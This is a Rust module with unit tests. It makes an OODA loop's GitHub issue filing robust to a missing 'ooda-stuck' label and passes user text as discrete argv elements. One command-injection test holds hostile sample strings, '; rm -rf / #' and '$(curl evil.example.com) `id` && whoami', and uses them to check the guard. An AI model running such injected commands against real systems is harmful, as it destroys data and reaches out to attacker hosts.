//! Pure, subprocess-free helpers that make every OODA stuck-goal issue filer
//! robust to a missing `ooda-stuck` GitHub label.
//!
//! ROOT CAUSE (simard-ooda journal `2026-07-21T12:40:45Z`, `cycle=2337`): the
//! `ooda-stuck` label did not exist in `rysweet/Simard`, yet all three
//! stuck-goal filing sites shelled out to
//! `gh issue create --label ooda-stuck`, which fails hard when the label is
//! absent (`stderr=could not add label: 'ooda-stuck' not found`). No tracking
//! issue was ever filed, so genuinely-stuck goals got no linked artifact and
//! the operator safety net was silently non-functional.
//!
//! This module factors the *decision logic* out of the three subprocess call
//! sites (mirroring the existing `parse_issue_number` factoring in
//! [`crate::ooda_loop::no_progress`]) so the missing-label handling is
//! unit-testable with **no subprocess mocking**:
//!
//! * [`is_missing_label_error`] — narrow classifier: is a failed
//!   `gh issue create` a missing-label failure eligible for a label-less
//!   retry? Deliberately narrow so auth / rate-limit / network / repo errors
//!   are never masked.
//! * [`label_already_exists`] — treats a concurrent `gh label create` race as
//!   success (idempotence).
//! * [`issue_create_argv`] — the single source of truth for the
//!   `gh issue create` argv, shared by every site. `title`/`body` are always
//!   discrete argv elements (the command-injection guard).
//! * [`ensure_ooda_stuck_label`] — best-effort, idempotent `gh label create`.
//!
//! See `docs/reference/ooda-stuck-label-resilience-api.md`.

use crate::error::{SimardError, SimardResult};

/// The GitHub label all stuck-goal tracking issues are tagged with.
pub const OODA_STUCK_LABEL: &str = "ooda-stuck";

/// True when `stderr` from a failed `gh issue create` indicates the `--label`
/// value does not exist (so a label-less retry is warranted). Case-insensitive
/// substring match. Returns `false` for any other failure (auth, rate-limit,
/// network, repo) so real errors are never masked by the fallback path.
///
/// The classifier is deliberately narrow: it requires BOTH the word `label`
/// and a `not found` / `could not add label` phrasing to appear, so a bare
/// repository `Not Found (HTTP 404)` (which has no label context) is not
/// misclassified.
pub fn is_missing_label_error(stderr: &str) -> bool {
    let lower = stderr.to_ascii_lowercase();
    if !lower.contains("label") {
        return false;
    }
    lower.contains("could not add label") || lower.contains("not found")
}

/// True when `gh label create` failed only because the label already exists —
/// treated as success by [`ensure_ooda_stuck_label`]. Case-insensitive
/// substring match on `already exists`.
pub fn label_already_exists(stderr: &str) -> bool {
    stderr.to_ascii_lowercase().contains("already exists")
}

/// Build the argv for `gh issue create`. When `with_label` is true the vector
/// ends with `["--label", "ooda-stuck"]`; when false those two elements are
/// omitted (the label-less fallback). `title` and `body` are always discrete
/// elements — no shell, no `sh -c`.
pub fn issue_create_argv<'a>(title: &'a str, body: &'a str, with_label: bool) -> Vec<&'a str> {
    let mut argv = vec!["issue", "create", "--title", title, "--body", body];
    if with_label {
        argv.push("--label");
        argv.push(OODA_STUCK_LABEL);
    }
    argv
}

/// Tracing target for the no-progress breaker filer (`no_progress.rs`).
pub const TARGET_OODA: &str = "simard::ooda";
/// Tracing target for the engineer-lifecycle / brain-failure sites
/// (`advance_goal::spawn`).
pub const TARGET_OODA_BRAIN: &str = "simard::ooda_brain";

/// Best-effort, idempotent `gh label create ooda-stuck`. Returns `Ok(())` when
/// the label exists afterwards (created now, or already present per
/// [`label_already_exists`]). A spawn error or a non-"already exists" failure
/// is logged on `target` and returns `Err`, but callers treat this as
/// non-fatal and proceed to the create attempt regardless. Never panics.
///
/// `target` selects the per-site tracing target ([`TARGET_OODA`] or
/// [`TARGET_OODA_BRAIN`]); an unrecognised value falls back to
/// [`TARGET_OODA`]. Dispatch is required because the `tracing` macros demand a
/// literal `target:`.
pub fn ensure_ooda_stuck_label(target: &'static str) -> SimardResult<()> {
    match std::process::Command::new("gh")
        .args(["label", "create", OODA_STUCK_LABEL])
        .output()
    {
        Ok(out) if out.status.success() => {
            trace_label_created(target);
            Ok(())
        }
        Ok(out) => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            if label_already_exists(&stderr) {
                // Idempotent: the label already exists (created earlier or by a
                // concurrent OODA run). This is the steady-state happy path.
                Ok(())
            } else {
                // Surface the real failure (auth, rate-limit, repo, network).
                // Non-fatal: callers still attempt `gh issue create`.
                trace_label_failed(target, &stderr);
                Err(SimardError::ActionExecutionFailed {
                    action: "gh label create ooda-stuck".to_string(),
                    reason: stderr.trim().to_string(),
                })
            }
        }
        Err(e) => {
            trace_label_spawn_failed(target, &e.to_string());
            Err(SimardError::ActionExecutionFailed {
                action: "gh label create ooda-stuck".to_string(),
                reason: e.to_string(),
            })
        }
    }
}

fn trace_label_created(target: &str) {
    if target == TARGET_OODA_BRAIN {
        tracing::info!(
            target: "simard::ooda_brain",
            label = OODA_STUCK_LABEL,
            "ensure_ooda_stuck_label: created missing label",
        );
    } else {
        tracing::info!(
            target: "simard::ooda",
            label = OODA_STUCK_LABEL,
            "ensure_ooda_stuck_label: created missing label",
        );
    }
}

fn trace_label_failed(target: &str, stderr: &str) {
    if target == TARGET_OODA_BRAIN {
        tracing::warn!(
            target: "simard::ooda_brain",
            label = OODA_STUCK_LABEL,
            stderr = %stderr,
            "ensure_ooda_stuck_label: gh label create failed (non-fatal, proceeding to issue create)",
        );
    } else {
        tracing::warn!(
            target: "simard::ooda",
            label = OODA_STUCK_LABEL,
            stderr = %stderr,
            "ensure_ooda_stuck_label: gh label create failed (non-fatal, proceeding to issue create)",
        );
    }
}

fn trace_label_spawn_failed(target: &str, error: &str) {
    if target == TARGET_OODA_BRAIN {
        tracing::warn!(
            target: "simard::ooda_brain",
            label = OODA_STUCK_LABEL,
            error = %error,
            "ensure_ooda_stuck_label: gh spawn failed (non-fatal, proceeding to issue create)",
        );
    } else {
        tracing::warn!(
            target: "simard::ooda",
            label = OODA_STUCK_LABEL,
            error = %error,
            "ensure_ooda_stuck_label: gh spawn failed (non-fatal, proceeding to issue create)",
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- is_missing_label_error --------------------------------------------

    /// The exact production failure signature must be classified as a
    /// missing-label error so the label-less retry is triggered.
    #[test]
    fn production_signature_is_missing_label() {
        let stderr = "could not add label: 'ooda-stuck' not found";
        assert!(
            is_missing_label_error(stderr),
            "the observed production stderr must be treated as a missing-label failure"
        );
    }

    /// Matching is case-insensitive: the same signature in a different case
    /// must still be recognised.
    #[test]
    fn missing_label_match_is_case_insensitive() {
        let stderr = "COULD NOT ADD LABEL: 'ooda-stuck' NOT FOUND";
        assert!(is_missing_label_error(stderr));
    }

    /// Alternate phrasings that combine `label` with `not found` must also be
    /// recognised (the classifier is not pinned to one exact string).
    #[test]
    fn label_not_found_phrasing_is_missing_label() {
        assert!(is_missing_label_error(
            "the 'ooda-stuck' label was not found in this repository"
        ));
    }

    /// ERROR-MASKING GUARD: an authentication failure must NOT be treated as a
    /// missing-label error, otherwise the label-less retry would mask a real
    /// auth problem.
    #[test]
    fn auth_error_is_not_missing_label() {
        assert!(!is_missing_label_error("HTTP 401: Bad credentials"));
    }

    /// ERROR-MASKING GUARD: a rate-limit failure must NOT be retried without a
    /// label.
    #[test]
    fn rate_limit_error_is_not_missing_label() {
        assert!(!is_missing_label_error("API rate limit exceeded"));
    }

    /// ERROR-MASKING GUARD: a repository `Not Found` (HTTP 404) has no `label`
    /// context and must NOT be treated as a missing-label error, even though it
    /// contains the words "not found".
    #[test]
    fn repo_not_found_is_not_missing_label() {
        assert!(!is_missing_label_error(
            "gh: Not Found (HTTP 404): repository rysweet/Simard"
        ));
    }

    /// ERROR-MASKING GUARD: a generic network failure must NOT be retried
    /// without a label.
    #[test]
    fn network_error_is_not_missing_label() {
        assert!(!is_missing_label_error(
            "error connecting to api.github.com: dial tcp: lookup timeout"
        ));
    }

    /// Empty stderr must be classified as "not a missing-label error" so a
    /// non-descriptive failure is never blindly retried.
    #[test]
    fn empty_stderr_is_not_missing_label() {
        assert!(!is_missing_label_error(""));
    }

    // ---- label_already_exists ----------------------------------------------

    /// The `gh label create` "already exists" stderr must be treated as
    /// success (idempotence across concurrent OODA runs).
    #[test]
    fn already_exists_stderr_is_success() {
        let stderr = r#"GraphQL: Label "ooda-stuck" already exists (createLabel)"#;
        assert!(label_already_exists(stderr));
    }

    /// The idempotence classifier is case-insensitive.
    #[test]
    fn already_exists_is_case_insensitive() {
        assert!(label_already_exists("Label ALREADY EXISTS"));
    }

    /// A `gh label create` failure that is NOT "already exists" must return
    /// false so the ensure step can surface it.
    #[test]
    fn other_label_create_error_is_not_already_exists() {
        assert!(!label_already_exists("HTTP 403: forbidden"));
        assert!(!label_already_exists(""));
    }

    // ---- issue_create_argv -------------------------------------------------

    /// The label-included argv must be byte-for-byte identical to the pre-fix
    /// command — this is what guarantees "unchanged behaviour when the label
    /// exists".
    #[test]
    fn argv_with_label_matches_prefix_command() {
        assert_eq!(
            issue_create_argv("T", "B", true),
            vec![
                "issue",
                "create",
                "--title",
                "T",
                "--body",
                "B",
                "--label",
                "ooda-stuck",
            ],
        );
    }

    /// The label-less fallback argv must omit exactly the `--label ooda-stuck`
    /// pair and nothing else.
    #[test]
    fn argv_without_label_omits_label_pair() {
        let argv = issue_create_argv("T", "B", false);
        assert_eq!(argv, vec!["issue", "create", "--title", "T", "--body", "B"]);
        assert!(!argv.contains(&"--label"));
        assert!(!argv.contains(&"ooda-stuck"));
    }

    /// COMMAND-INJECTION GUARD: `title` and `body` must be preserved as single
    /// discrete argv elements even when they contain shell metacharacters, so
    /// they can never be interpreted by a shell. They are passed to
    /// `Command::args`, which does not invoke a shell.
    #[test]
    fn argv_keeps_title_and_body_as_discrete_elements() {
        let title = r#"; rm -rf / #"#;
        let body = "$(curl evil.example.com) `id` && whoami";
        let argv = issue_create_argv(title, body, true);

        // title is the element immediately after "--title", verbatim.
        let title_idx = argv.iter().position(|a| *a == "--title").unwrap();
        assert_eq!(argv[title_idx + 1], title);

        // body is the element immediately after "--body", verbatim.
        let body_idx = argv.iter().position(|a| *a == "--body").unwrap();
        assert_eq!(argv[body_idx + 1], body);

        // The metacharacter-laden strings never leak into other positions.
        assert_eq!(argv.iter().filter(|a| **a == title).count(), 1);
        assert_eq!(argv.iter().filter(|a| **a == body).count(), 1);
    }
}
